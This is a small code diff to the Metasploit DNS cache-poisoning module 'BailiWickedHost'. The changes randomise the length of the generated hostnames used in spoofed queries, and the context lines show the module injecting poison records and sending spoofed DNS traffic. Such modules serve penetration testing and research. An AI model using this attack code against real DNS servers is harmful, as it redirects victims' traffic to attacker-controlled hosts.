@@ -282,7 +282,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 		print_status( "Attempting to inject a poison record for #{hostname} into #{target}:#{sport}...")
 
 		while true
-			randhost = Rex::Text.rand_text_alphanumeric(12) + '.' + domain # randomize the hostname
+			randhost = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain # randomize the hostname
 
 			# Send spoofed query
 			req = Resolv::DNS::Message.new
@@ -400,7 +400,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 
 		times   = []
 		
-		hostname = Rex::Text.rand_text_alphanumeric(16) + '.' + domain
+		hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain
 				
 		sock = Rex::Socket.create_udp(
 			'PeerHost' => server,
@@ -428,7 +428,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 					times << [Time.now.to_f - q_beg_t, cnt]
 					cnt = 0
 					
-					hostname = Rex::Text.rand_text_alphanumeric(16) + '.' + domain
+					hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain
 
 					Thread.critical = false
 					
